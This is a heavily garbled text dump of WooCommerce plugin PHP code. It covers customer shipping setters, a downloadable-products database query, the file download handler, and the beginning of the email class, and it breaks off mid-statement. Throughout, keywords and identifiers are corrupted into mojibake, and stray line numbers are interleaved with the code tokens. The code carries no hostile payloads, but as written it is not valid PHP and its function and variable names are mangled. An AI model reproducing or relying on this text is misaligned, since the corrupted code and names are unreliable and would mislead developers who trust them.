$c™y
;

501 
public
 
funùiÚ
 
	$£t_shpšg_couÁry
Ğ
$couÁry
 ) {

502 
$this
->
shpšg_couÁry
 = 
$couÁry
;

503 
	}
}

513 
public
 
funùiÚ
 
	$£t_shpšg_¡©e
Ğ
$¡©e
 ) {

514 
$this
->
shpšg_¡©e
 = 
$¡©e
;

515 
	}
}

525 
public
 
funùiÚ
 
	$£t_shpšg_po¡code
Ğ
$po¡code
 ) {

526 
$this
->
shpšg_po¡code
 = 
$po¡code
;

527 
	}
}

537 
public
 
funùiÚ
 
	$£t_shpšg_c™y
Ğ
$c™y
 ) {

538 
$this
->
shpšg_c™y
 = 
$c™y
;

539 
	}
}

548 
public
 
funùiÚ
 
	$£t_shpšg_add»ss
Ğ
$add»ss
 ) {

549 
$this
->
shpšg_add»ss
 = 
$add»ss
;

550 
	}
}

559 
public
 
funùiÚ
 
	$£t_shpšg_add»ss_2
Ğ
$add»ss_2
 ) {

560 
$this
->
shpšg_add»ss_2
 = 
$add»ss_2
;

561 
	}
}

571 
public
 
funùiÚ
 
	$£t_is_v©_exem±
Ğ
$is_v©_exem±
 ) {

572 
$this
->
is_v©_exem±
 = 
$is_v©_exem±
;

573 
	}
}

583 
public
 
funùiÚ
 
	$ÿlcuÏ‹d_shpšg
Ğ
$ÿlcuÏ‹d
 = 
Œue
 ) {

584 
$this
->
ÿlcuÏ‹d_shpšg
 = 
$ÿlcuÏ‹d
;

585 
	}
}

594 
public
 
funùiÚ
 
	$g‘_dowÆßdabË_´oduùs
() {

595 
glob®
 
$wpdb
;

597 
$dowÆßds
 = 
	`¬¿y
();

598 
$_´oduù
 = 
nuÎ
;

599 
$Üd”
 = 
nuÎ
;

600 
$fe_numb”
 = 0;

602 iàĞ
	`is_u£r_logged_š
() ) {

605 
$»suÉs
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
( "

606 
SELECT
 
³rmissiÚs
.*

607 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_dowÆßdabË_´oduù_³rmissiÚs
 
as
 
³rmissiÚs


608 
LEFT
 
JOIN
 {
$wpdb
->
po¡s
} 
as
…o¡ 
ON
 
³rmissiÚs
.
Üd”_id
 =…o¡s.
ID


609 
WHERE
 
u£r_id
 = %
s


610 
AND
 
³rmissiÚs
.
Üd”_id
 > 0

611 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

612 
AND


614 
³rmissiÚs
.
dowÆßds_»maššg
 > 0

615 
OR


616 
³rmissiÚs
.
dowÆßds_»maššg
 = ''

618 
AND


620 
³rmissiÚs
.
acûss_expœes
 
IS
 
NULL


621 
OR


622 
³rmissiÚs
.
acûss_expœes
 >ğ%
s


624 
GROUP
 
BY
 
³rmissiÚs
.
dowÆßd_id


625 
ORDER
 
BY
 
³rmissiÚs
.
Üd”_id
,…”missiÚs.
´oduù_id
,…”missiÚs.
³rmissiÚ_id
;

628 iàĞ
$»suÉs
 ) {

629 
	`fÜ—ch
 ( 
$»suÉs
 
as
 
$»suÉ
 ) {

630 iàĞ! 
$Üd”
 || $Üd”->
id
 !ğ
$»suÉ
->
Üd”_id
 ) {

632 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$»suÉ
->
Üd”_id
 );

633 
$_´oduù
 = 
nuÎ
;

637 iàĞ! 
$Üd”
->
	`is_dowÆßd_³rm™‹d
() ) {

641 iàĞ! 
$_´oduù
 || $_´oduù->
id
 !ğ
$»suÉ
->
´oduù_id
 ) {

643 
$fe_numb”
 = 0;

644 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$»suÉ
->
´oduù_id
 );

648 iàĞ! 
$_´oduù
 || ! $_´oduù->
	`exi¡s
(è|| ! $_´oduù->
	`has_fe
Ğ
$»suÉ
->
dowÆßd_id
 ) ) {

652 
$dowÆßd_fe
 = 
$_´oduù
->
	`g‘_fe
Ğ
$»suÉ
->
dowÆßd_id
 );

654 
$dowÆßd_Çme
 = 
	`­¶y_f‹rs
(

656 
$_´oduù
->
	`g‘_t™Ë
(è. ' &ndash; ' . 
$dowÆßd_fe
['name'],

657 
$_´oduù
,

658 
$»suÉ
->
dowÆßd_id
,

659 
$fe_numb”


662 
$dowÆßds
[] = 
	`¬¿y
(

663 'dowÆßd_u¾' => 
	`add_qu”y_¬g
Ğ
	`¬¿y
Ğ'dowÆßd_fe' => 
$»suÉ
->
´oduù_id
, 'Üd”' => $»suÉ->
Üd”_key
, 'ema' => $»suÉ->
u£r_ema
, 'key' => $»suÉ->
dowÆßd_id
 ), 
	`home_u¾
( '/', 'http' ) ),

664 'dowÆßd_id' => 
$»suÉ
->
dowÆßd_id
,

665 '´oduù_id' => 
$»suÉ
->
´oduù_id
,

666 'dowÆßd_Çme' => 
$dowÆßd_Çme
,

667 'Üd”_id' => 
$Üd”
->
id
,

668 'Üd”_key' => 
$Üd”
->
Üd”_key
,

669 'dowÆßds_»maššg' => 
$»suÉ
->
dowÆßds_»maššg


672 
$fe_numb”
++;

677  
	`­¶y_f‹rs
Ğ'woocomm”û_cu¡om”_g‘_dowÆßdabË_´oduùs', 
$dowÆßds
 );

678 
	}
}

	@includes/class-wc-download-handler.php

1 <?
php


13 şas 
	cWC_DowÆßd_HªdËr
 {

18 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

19 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'download_product' ) );

25 
public
 
funùiÚ
 
	$dowÆßd_´oduù
() {

26 iàĞ
	`is£t
Ğ
$_GET
['download_file'] ) && isset( $_GET['order'] ) && isset( $_GET['email'] ) ) {

28 
glob®
 
$wpdb
;

30 
$´oduù_id
 = (è
$_GET
['download_file'];

31 
$Üd”_key
 = 
$_GET
['order'];

32 
$ema
 = 
	`§n™ize_ema
Ğ
	`¡r_»¶aû
Ğ' ', '+', 
$_GET
['email'] ) );

33 
$dowÆßd_id
 = 
	`is£t
Ğ
$_GET
['key'] ) ? 
	`´eg_»¶aû
( '/\s+/', ' ', $_GET['key'] ) : '';

34 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

36 iàĞ! 
	`is_ema
Ğ
$ema
) ) {

37 
	`wp_d›
Ğ
	`__
Ğ'Inv®idƒma‡dd»ss.', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`home_u¾
() ) . '" class="wc-forward">' . __( 'Goo homepage', 'woocommerce' ) . '</a>' );

40 
$qu”y
 = "

41 
SELECT
 
Üd”_id
,
dowÆßds_»maššg
,
u£r_id
,
dowÆßd_couÁ
,
acûss_expœes
,
dowÆßd_id


42 
FROM
 " . $wpdb->´efix . "
woocomm”û_dowÆßdabË_´oduù_³rmissiÚs


43 
WHERE
 
u£r_ema
 = %
s


44 
AND
 
Üd”_key
 = %
s


45 
AND
 
´oduù_id
 = %
s
";

47 
$¬gs
 = 
	`¬¿y
(

48 
$ema
,

49 
$Üd”_key
,

50 
$´oduù_id


53 iàĞ
$dowÆßd_id
 ) {

55 
$qu”y
 .= " AND download_id = %s";

56 
$¬gs
[] = 
$dowÆßd_id
;

59 
$dowÆßd_»suÉ
 = 
$wpdb
->
	`g‘_row
Ğ$wpdb->
	`´•¬e
Ğ
$qu”y
, 
$¬gs
 ) );

61 iàĞ! 
$dowÆßd_»suÉ
 ) {

62 
	`wp_d›
Ğ
	`__
Ğ'Inv®id dowÆßd.', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`home_u¾
() ) . '" class="wc-forward">' . __( 'Goo homepage', 'woocommerce' ) . '</a>' );

65 
$dowÆßd_id
 = 
$dowÆßd_»suÉ
->
dowÆßd_id
;

66 
$Üd”_id
 = 
$dowÆßd_»suÉ
->
Üd”_id
;

67 
$dowÆßds_»maššg
 = 
$dowÆßd_»suÉ
->
dowÆßds_»maššg
;

68 
$dowÆßd_couÁ
 = 
$dowÆßd_»suÉ
->
dowÆßd_couÁ
;

69 
$u£r_id
 = 
$dowÆßd_»suÉ
->
u£r_id
;

70 
$acûss_expœes
 = 
$dowÆßd_»suÉ
->
acûss_expœes
;

72 iàĞ
$u£r_id
 && 
	`g‘_İtiÚ
( 'woocommerce_downloads_require_login' ) == 'yes' ) {

74 iàĞ! 
	`is_u£r_logged_š
() ) {

75 
	`wp_d›
Ğ
	`__
Ğ'You mu¡ blogged iÀtØdowÆßd fes.', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`wp_logš_u¾
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) ) ) . '" class="wc-forward">' . __( 'Login', 'woocommerce' ) . '</a>', __( 'Log ino Download Files', 'woocommerce' ) );

76 } 
	`–£if
 ( ! 
	`cu¼’t_u£r_ÿn
Ğ'dowÆßd_fe', 
$dowÆßd_»suÉ
 ) ) {

77 
	`wp_d›
Ğ
	`__
( 'This is‚ot your download†ink.', 'woocommerce' ) );

82 iàĞ! 
	`g‘_po¡
Ğ
$´oduù_id
 ) ) {

83 
	`wp_d›
Ğ
	`__
Ğ'Produù‚ØlÚg”ƒxi¡s.', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`home_u¾
() ) . '" class="wc-forward">' . __( 'Goo homepage', 'woocommerce' ) . '</a>' );

86 iàĞ
$Üd”_id
 ) {

87 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

89 iàĞ! 
$Üd”
->
	`is_dowÆßd_³rm™‹d
(è|| $Üd”->
po¡_¡©us
 != 'publish' ) {

90 
	`wp_d›
Ğ
	`__
Ğ'Inv®id ord”.', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`home_u¾
() ) . '" class="wc-forward">' . __( 'Goo homepage', 'woocommerce' ) . '</a>' );

94 iàĞ
$dowÆßds_»maššg
 == '0' ) {

95 
	`wp_d›
Ğ
	`__
Ğ'SÜry, you hav»ached you¸dowÆßd†im™ fÜhi fe', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`home_u¾
() ) . '" class="wc-forward">' . __( 'Goo homepage', 'woocommerce' ) . '</a>' );

98 iàĞ
$acûss_expœes
 > 0 && 
	`¡¹Ùime
Ğ$acûss_expœesè< 
	`cu¼’t_time
( 'timestamp' ) ) {

99 
	`wp_d›
Ğ
	`__
Ğ'SÜry,hi dowÆßd ha expœed', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`home_u¾
() ) . '" class="wc-forward">' . __( 'Goo homepage', 'woocommerce' ) . '</a>' );

102 iàĞ
$dowÆßds_»maššg
 > 0 ) {

103 
$wpdb
->
	`upd©e
Ğ$wpdb->
´efix
 . "woocomm”û_dowÆßdabË_´oduù_³rmissiÚs", 
	`¬¿y
(

104 'dowÆßds_»maššg' => 
$dowÆßds_»maššg
 - 1,

105 ), 
	`¬¿y
(

106 'u£r_ema' => 
$ema
,

107 'Üd”_key' => 
$Üd”_key
,

108 '´oduù_id' => 
$´oduù_id
,

109 'dowÆßd_id' => 
$dowÆßd_id


110 ), 
	`¬¿y
( '%d' ),‡rray( '%s', '%s', '%d', '%s' ) );

114 
$wpdb
->
	`upd©e
Ğ$wpdb->
´efix
 . "woocomm”û_dowÆßdabË_´oduù_³rmissiÚs", 
	`¬¿y
(

115 'dowÆßd_couÁ' => 
$dowÆßd_couÁ
 + 1,

116 ), 
	`¬¿y
(

117 'u£r_ema' => 
$ema
,

118 'Üd”_key' => 
$Üd”_key
,

119 '´oduù_id' => 
$´oduù_id
,

120 'dowÆßd_id' => 
$dowÆßd_id


121 ), 
	`¬¿y
( '%d' ),‡rray( '%s', '%s', '%d', '%s' ) );

124 
	`do_aùiÚ
Ğ'woocomm”û_dowÆßd_´oduù', 
$ema
, 
$Üd”_key
, 
$´oduù_id
, 
$u£r_id
, 
$dowÆßd_id
, 
$Üd”_id
 );

127 
$fe_·th
 = 
$_´oduù
->
	`g‘_fe_dowÆßd_·th
Ğ
$dowÆßd_id
 );

130 
$this
->
	`dowÆßd
Ğ
$fe_·th
, 
$´oduù_id
 );

132 
	}
}

137 
public
 
funùiÚ
 
	$dowÆßd
Ğ
$fe_·th
, 
$´oduù_id
 ) {

138 
glob®
 
$wpdb
, 
$is_IE
;

140 
$fe_dowÆßd_m‘hod
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_fe_dowÆßd_m‘hod', 
	`g‘_İtiÚ
Ğ'woocomm”û_fe_dowÆßd_m‘hod' ), 
$´oduù_id
 );

142 iàĞ! 
$fe_·th
 ) {

143 
	`wp_d›
Ğ
	`__
Ğ'NØfdefšed', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`home_u¾
() ) . '" class="wc-forward">' . __( 'Goo homepage', 'woocommerce' ) . '</a>' );

147 iàĞ
$fe_dowÆßd_m‘hod
 == "redirect" ) {

148 
	`h—d”
Ğ'LoÿtiÚ: ' . 
$fe_·th
 );

149 
ex™
;

153 
$»mÙe_fe
 = 
Œue
;

154 
$·r£d_fe_·th
 = 
	`·r£_u¾
Ğ
$fe_·th
 );

156 
$wp_u¶ßds
 = 
	`wp_u¶ßd_dœ
();

157 
$wp_u¶ßds_dœ
 = 
$wp_u¶ßds
['basedir'];

158 
$wp_u¶ßds_u¾
 = 
$wp_u¶ßds
['baseurl'];

160 iàĞĞ! 
	`is£t
Ğ
$·r£d_fe_·th
['scheme'] ) || ! 
	`š_¬¿y
Ğ$·r£d_fe_·th['scheme'], 
	`¬¿y
Ğ'h‰p', 'h‰ps', 'áp' ) ) ) && is£tĞ$·r£d_fe_·th['·th'] ) && 
	`fe_exi¡s
( $parsed_file_path['path'] ) ) {

163 
$»mÙe_fe
 = 
çl£
;

165 } 
	`–£if
Ğ
	`¡½os
Ğ
$fe_·th
, 
$wp_u¶ßds_u¾
 ) !=ğ
çl£
 ) {

168 
$»mÙe_fe
 = 
çl£
;

169 
$fe_·th
 = 
	`¡r_»¶aû
Ğ
$wp_u¶ßds_u¾
, 
$wp_u¶ßds_dœ
, $file_path );

171 } 
	`–£if
Ğ
	`is_muÉis™e
(è&& ( 
	`¡½os
Ğ
$fe_·th
, 
	`ÃtwÜk_s™e_u¾
Ğ'/', 'h‰p' ) ) !=ğ
çl£
 || strpos( $file_path,‚etwork_site_url( '/', 'https' ) ) !== false ) ) {

174 
$»mÙe_fe
 = 
çl£
;

176 
$fe_·th
 = 
	`¡r_»¶aû
Ğ
	`ÃtwÜk_s™e_u¾
Ğ'/', 'h‰ps' ), 
ABSPATH
, $file_path );

177 
$fe_·th
 = 
	`¡r_»¶aû
Ğ
	`ÃtwÜk_s™e_u¾
Ğ'/', 'h‰p' ), 
ABSPATH
, $file_path );

179 
$fe_·th
 = 
	`¡r_»¶aû
Ğ
$wp_u¶ßds_u¾
, 
$wp_u¶ßds_dœ
, $file_path );

181 } 
	`–£if
Ğ
	`¡½os
Ğ
$fe_·th
, 
	`s™e_u¾
Ğ'/', 'h‰p' ) ) !=ğ
çl£
 || strpos( $file_path, site_url( '/', 'https' ) ) !== false ) {

184 
$»mÙe_fe
 = 
çl£
;

185 
$fe_·th
 = 
	`¡r_»¶aû
Ğ
	`s™e_u¾
Ğ'/', 'h‰ps' ), 
ABSPATH
, $file_path );

186 
$fe_·th
 = 
	`¡r_»¶aû
Ğ
	`s™e_u¾
Ğ'/', 'h‰p' ), 
ABSPATH
, $file_path );

188 } 
	`–£if
 ( 
	`fe_exi¡s
Ğ
ABSPATH
 . 
$fe_·th
 ) ) {

191 
$»mÙe_fe
 = 
çl£
;

192 
$fe_·th
 = 
ABSPATH
 . $file_path;

195 iàĞ! 
$»mÙe_fe
 ) {

197 iàĞ
	`¡r¡r
Ğ
$fe_·th
, '?' ) ) {

198 
$fe_·th
 = 
	`cu¼’t
Ğ
	`ex¶ode
( '?', $file_path ) );

202 
$fe_·th
 = 
	`»®·th
( $file_path );

206 
$fe_ex‹nsiÚ
 = 
	`¡¹Şow”
Ğ
	`sub¡r
Ğ
	`¡¼chr
Ğ
$fe_·th
, "." ), 1 ) );

207 
$ùy³
 = "application/force-download";

209 
	`fÜ—ch
 ( 
	`g‘_®lowed_mime_ty³s
(è
as
 
$mime
 => 
$ty³
 ) {

210 
$mimes
 = 
	`ex¶ode
Ğ'|', 
$mime
 );

211 iàĞ
	`š_¬¿y
Ğ
$fe_ex‹nsiÚ
, 
$mimes
 ) ) {

212 
$ùy³
 = 
$ty³
;

218 iàĞ! 
	`ši_g‘
('safe_mode') ) {

219 @
	`£t_time_lim™
(0);

222 iàĞ
	`funùiÚ_exi¡s
Ğ'g‘_magic_quÙes_ruÁime' ) && 
	`g‘_magic_quÙes_ruÁime
() ) {

223 @
	`£t_magic_quÙes_ruÁime
(0);

226 iàĞ
	`funùiÚ_exi¡s
( 'apache_setenv' ) ) {

227 @
	`­ache_£‹nv
( 'no-gzip', 1 );

230 @
	`£ssiÚ_wr™e_şo£
();

231 @
	`ši_£t
( 'zlib.output_compression', 'Off' );

236 @
	`ob_’d_ş—n
();

238 iàĞ
	`ob_g‘_Ëv–
() ) {

240 
$Ëv–s
 = 
	`ob_g‘_Ëv–
();

242  
$i
 = 0; $˜< 
$Ëv–s
; $i++ ) {

243 @
	`ob_’d_ş—n
();

248 iàĞ
$is_IE
 && 
	`is_s¦
() ) {

250 
	`h—d”
( 'Expires: Wed, 11 Jan 1984 05:00:00 GMT' );

251 
	`h—d”
( 'Cache-Control:…rivate' );

253 
	`noÿche_h—d”s
();

256 
$f’ame
 = 
	`ba£Çme
Ğ
$fe_·th
 );

258 iàĞ
	`¡r¡r
Ğ
$f’ame
, '?' ) ) {

259 
$f’ame
 = 
	`cu¼’t
Ğ
	`ex¶ode
( '?', $filename ) );

262 
$f’ame
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_fe_dowÆßd_f’ame', $f’ame, 
$´oduù_id
 );

264 
	`h—d”
Ğ"X-RobÙs-Tag:‚ošdex,‚ofŞlow", 
Œue
 );

265 
	`h—d”
Ğ"CÚ‹Á-Ty³: " . 
$ùy³
 );

266 
	`h—d”
( "Content-Description: File Transfer" );

267 
	`h—d”
Ğ"CÚ‹Á-Di¥os™iÚ:‡‰achm’t; f’ame=\"" . 
$f’ame
 . "\";" );

268 
	`h—d”
( "Content-Transfer-Encoding: binary" );

270 iàĞ
$size
 = @
	`fesize
Ğ
$fe_·th
 ) ) {

271 
	`h—d”
Ğ"CÚ‹Á-L’gth: " . 
$size
 );

274 iàĞ
$fe_dowÆßd_m‘hod
 == 'xsendfile' ) {

277 iàĞ
	`g‘cwd
() ) {

278 
$fe_·th
 = 
	`Œim
Ğ
	`´eg_»¶aû
Ğ'`^' . 
	`¡r_»¶aû
Ğ'\\', '/', 
	`g‘cwd
() ) . '`' , '', $file_path ), '/' );

281 
	`h—d”
Ğ"CÚ‹Á-Di¥os™iÚ:‡‰achm’t; f’ame=\"" . 
$f’ame
 . "\";" );

283 iàĞ
	`funùiÚ_exi¡s
Ğ'­ache_g‘_moduËs' ) && 
	`š_¬¿y
Ğ'mod_x£ndfe', 
	`­ache_g‘_moduËs
() ) ) {

285 
	`h—d”
("X-Sendfile: $file_path");

286 
ex™
;

288 } 
	`–£if
 ( 
	`¡ri¡r
Ğ
	`g‘’v
( 'SERVER_SOFTWARE' ), 'lighttpd' ) ) {

290 
	`h—d”
( "X-Lighttpd-Sendfile: $file_path" );

291 
ex™
;

293 } 
	`–£if
 ( 
	`¡ri¡r
Ğ
	`g‘’v
( 'SERVER_SOFTWARE' ), 'nginx' ) || stristr( getenv( 'SERVER_SOFTWARE' ), 'cherokee' ) ) {

295 
	`h—d”
( "X-Accel-Redirect: /$file_path" );

296 
ex™
;

301 iàĞ
$»mÙe_fe
 ) {

302 
$this
->
	`»adfe_chunked
Ğ
$fe_·th
 ) 
Ü
 
	`h—d”
( 'Location: ' . $file_path );

304 
$this
->
	`»adfe_chunked
Ğ
$fe_·th
 ) 
Ü
 
	`wp_d›
Ğ
	`__
Ğ'FnÙ found', 'woocomm”û' ) . ' <¨h»f="' . 
	`esc_u¾
Ğ
	`home_u¾
() ) . '" class="wc-forward">' . __( 'Goo homepage', 'woocommerce' ) . '</a>' );

307 
ex™
;

308 
	}
}

318 
public
 
funùiÚ
 
	$»adfe_chunked
Ğ
$fe
, 
$»tby‹s
 = 
Œue
 ) {

320 
$chunksize
 = 1 * ( 1024 * 1024 );

321 
$bufãr
 = '';

322 
$út
 = 0;

324 
$hªdË
 = @
	`fİ’
Ğ
$fe
, 'r' );

325 iàĞ
$hªdË
 ==ğ
FALSE
 ) {

326  
FALSE
;

329  ! 
	`ãof
Ğ
$hªdË
 ) ) {

330 
$bufãr
 = 
	`ä—d
Ğ
$hªdË
, 
$chunksize
 );

331 
echo
 
$bufãr
;

332 @
	`ob_æush
();

333 @
	`æush
();

335 iàĞ
$»tby‹s
 ) {

336 
$út
 +ğ
	`¡¾’
Ğ
$bufãr
 );

340 
$¡©us
 = 
	`fşo£
Ğ
$hªdË
 );

342 iàĞ
$»tby‹s
 && 
$¡©us
 ) {

343  
$út
;

346  
$¡©us
;

347 
	}
}

350 
Ãw
 
WC_DowÆßd_HªdËr
();

	@includes/class-wc-emails.php

1 <?
php


13 şas 
	cWC_Emas
 {

19 
public
 
	m$emas
;

25 
´iv©e
 
	m$_äom_add»ss
;

31 
´iv©e
 
	m$_äom_Çme
;

37 
´iv©e
 
	m$_cÚ‹Á_ty³
;

43 
´Ùeùed
 
	m$_š¡ªû
 = 
nuÎ
;

55 
public
 
funùiÚ
 
	$š¡ªû
() {

56 iàĞ
	`is_nuÎ
Ğ
£lf
::
$_š¡ªû
 ) )

57 
£lf
::
$_š¡ªû
 = 
Ãw
 
	`£lf
();

58  
£lf
::
$_š¡ªû
;

66 
public
 
funùiÚ
 
	$__şÚe
() {

67 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

68 
	}
}

75 
public
 
funùiÚ
 
	$__wakeup
() {

76 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

77 
	}
}

85 
funùiÚ
 
	$__cÚ¡ruù
() {

87 
$this
->
	`š™
();

90 
	`add_aùiÚ
Ğ'woocomm”û_ema_h—d”', 
	`¬¿y
Ğ
$this
, 'email_header' ) );

91 
	`add_aùiÚ
Ğ'woocomm”û_ema_foÙ”', 
	`¬¿y
Ğ
$this
, 'email_footer' ) );

92 
	`add_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
	`¬¿y
Ğ
$this
, 'order_meta' ), 10, 3 );

95 
	`add_aùiÚ
Ğ'woocomm”û_low_¡ock_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'low_stock' ) );

96 
	`add_aùiÚ
Ğ'woocomm”û_no_¡ock_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'no_stock' ) );

97 
	`add_aùiÚ
Ğ'woocomm”û_´oduù_Ú_backÜd”_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'backorder' ) );

98 
	`add_aùiÚ
Ğ'woocomm”û_ü—‹d_cu¡om”_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'customer_new_account' ), 10, 3 );

101 
	`do_aùiÚ
Ğ'woocomm”û_ema', 
$this
 );

102 
	}
}

107 
funùiÚ
 
	$š™
() {

109 
	`šşude_Úû
( 'abstracts/abstract-wc-email.php' );

111 
$this
->
emas
['WC_Ema_New_Ord”'] = 
	`šşude
( 'emails/class-wc-email-new-order.php' );

112 
$this
->
emas
['WC_Ema_Cu¡om”_Proûssšg_Ord”'] = 
	`šşude
( 'emails/class-wc-email-customer-processing-order.php' );

113 
$this
->
emas
['WC_Ema_Cu¡om”_Com¶‘ed_Ord”'] = 
	`šşude
( 'emails/class-wc-email-customer-completed-order.php' );

114 
$this
->
emas
['WC_Ema_Cu¡om”_Invoiû'] = 
	`šşude
( 'emails/class-wc-email-customer-invoice.php' );

115 
$this
->
emas
['WC_Ema_Cu¡om”_NÙe'] = 
	`šşude
( 'emails/class-wc-email-customer-note.php' );

116 
$this
->
emas
['WC_Ema_Cu¡om”_Re£t_PasswÜd'] = 
	`šşude
( 'emails/class-wc-email-customer-reset-password.php' );

117 
$this
->
emas
['WC_Ema_Cu¡om”_New_AccouÁ'] = 
	`šşude
( 'emails/class-wc-email-customer-new-account.php' );

119 
$this
->
emas
 = 
	`­¶y_f‹rs
( 'woocommerce_email_classes', $this->emails );

120 
	}
}

128 
funùiÚ
 
	$g‘_emas
() {

129  
$this
->
emas
;

130 
	}
}

138 
funùiÚ
 
	$g‘_äom_Çme
() {

139 iàĞ! 
$this
->
_äom_Çme
 )

140 
$this
->
_äom_Çme
 = 
	`g‘_İtiÚ
( 'woocommerce_email_from_name' );

142  
	`wp_¥ecŸlch¬s_decode
Ğ
$this
->
_äom_Çme
 );

143 
	}
}

151 
funùiÚ
 
	$g‘_äom_add»ss
() {

152 iàĞ! 
$this
->
_äom_add»ss
 )

153 
$this
->
_äom_add»ss
 = 
	`g‘_İtiÚ
( 'woocommerce_email_from_address' );

155  
$this
->
_äom_add»ss
;

156 
	}
}

164 
funùiÚ
 
	$g‘_cÚ‹Á_ty³
() {

165  
$this
->
_cÚ‹Á_ty³
;

166 
	}
}

175 
funùiÚ
 
	$ema_h—d”
Ğ
$ema_h—dšg
 ) {

176 
	`wc_g‘_‹m¶©e
Ğ'emas/ema-h—d”.php', 
	`¬¿y
Ğ'ema_h—dšg' => 
$ema_h—dšg
 ) );

177 
	}
}

185 
funùiÚ
 
	$ema_foÙ”
() {

186 
	`wc_g‘_‹m¶©e
( 'emails/email-footer.php' );

187 
	}
}

197 
funùiÚ
 
	$w¿p_mes§ge
Ğ
$ema_h—dšg
, 
$mes§ge
, 
$¶aš_‹xt
 = 
çl£
 ) {

199 
	`ob_¡¬t
();

201 
	`do_aùiÚ
Ğ'woocomm”û_ema_h—d”', 
$ema_h—dšg
 );

203 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$mes§ge
 ) );

205 
	`do_aùiÚ
( 'woocommerce_email_footer' );

208 
$mes§ge
 = 
	`ob_g‘_ş—n
();

210  
$mes§ge
;

211 
	}
}

225 
funùiÚ
 
£nd
Ğ
$to
, 
$subjeù
, 
$mes§ge
, 
$h—d”s
 = "CÚ‹Á-Ty³:ext/html\r\n", 
$©chm’ts
 = "", 
$cÚ‹Á_ty³
 = 'text/html' ) {

228 
$this
->
_cÚ‹Á_ty³
 = 
$cÚ‹Á_ty³
;

231 
add_f‹r
Ğ'wp_ma_äom', 
¬¿y
Ğ
$this
, 'get_from_address' ) );

232 
add_f‹r
Ğ'wp_ma_äom_Çme', 
¬¿y
Ğ
$this
, 'get_from_name' ) );

233 
add_f‹r
Ğ'wp_ma_cÚ‹Á_ty³', 
¬¿y
Ğ
$this
, 'get_content_type' ) );

236 
wp_ma
Ğ
$to
, 
$subjeù
, 
$mes§ge
, 
$h—d”s
, 
$©chm’ts
 );

239 
»move_f‹r
Ğ'wp_ma_äom', 
¬¿y
Ğ
$this
, 'get_from_address' ) );

240 
»move_f‹r
Ğ'wp_ma_äom_Çme', 
¬¿y
Ğ
$this
, 'get_from_name' ) );

241 
»move_f‹r
Ğ'wp_ma_cÚ‹Á_ty³', 
¬¿y
Ğ
$this
, 'get_content_type' ) );

251 
funùiÚ
 
	$cu¡om”_švoiû
Ğ
$Üd”
 ) {

252 
$ema
 = 
$this
->
emas
['WC_Email_Customer_Invoice'];

253 
$ema
->
	`Œigg”
Ğ
$Üd”
 );

254 
	}
}

264 
funùiÚ
 
cu¡om”_Ãw_accouÁ
Ğ
$cu¡om”_id
, 
$Ãw_cu¡om”_d©a
 = 
¬¿y
(), 
$·sswÜd_g’”©ed
 = 
çl£
 ) {

265 iàĞ! 
$cu¡om”_id
 )

268 
	g$u£r_·ss
 = ! 
em±y
Ğ
$Ãw_cu¡om”_d©a
['user_pass'] ) ? $new_customer_data['user_pass'] : '';

270 
	g$ema
 = 
$this
->
emas
['WC_Email_Customer_New_Account'];

271 
	g$ema
->
Œigg”
Ğ
$cu¡om”_id
, 
$u£r_·ss
, 
$·sswÜd_g’”©ed
 );

283 
funùiÚ
 
	$Üd”_m‘a
Ğ
$Üd”
, 
$£Á_to_admš
 = 
çl£
, 
$¶aš_‹xt
 = false ) {

285 
$m‘a
 = 
	`¬¿y
();

286 
$show_f›lds
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ema_Üd”_m‘a_keys', 
	`¬¿y
(), 
$£Á_to_admš
 );

288 iàĞ
$Üd”
->
cu¡om”_nÙe
 )

289 
$m‘a
[ 
	`__
Ğ'NÙe', 'woocomm”û' ) ] = 
	`w±exturize
Ğ
$Üd”
->
cu¡om”_nÙe
 );

291 iàĞ
$show_f›lds
 )

292 
	`fÜ—ch
 ( 
$show_f›lds
 
as
 
$key
 => 
$f›ld
 ) {

293 iàĞ
	`is_num”ic
Ğ
$key
 ) )

294 
$key
 = 
$f›ld
;

296 
$m‘a
[ 
	`w±exturize
Ğ
$key
 ) ] = w±exturizeĞ
	`g‘_po¡_m‘a
Ğ
$Üd”
->
id
, 
$f›ld
, 
Œue
 ) );

299 iàĞĞ
$m‘a
 ) > 0 ) {

301 iàĞ
$¶aš_‹xt
 ) {

303 
	`fÜ—ch
 ( 
$m‘a
 
as
 
$key
 => 
$v®ue
 ) {

304 iàĞ
$v®ue
 ) {

305 
echo
 
$key
 . ': ' . 
$v®ue
 . "\n";

311 
	`fÜ—ch
 ( 
$m‘a
 
as
 
$key
 => 
$v®ue
 ) {

312 iàĞ
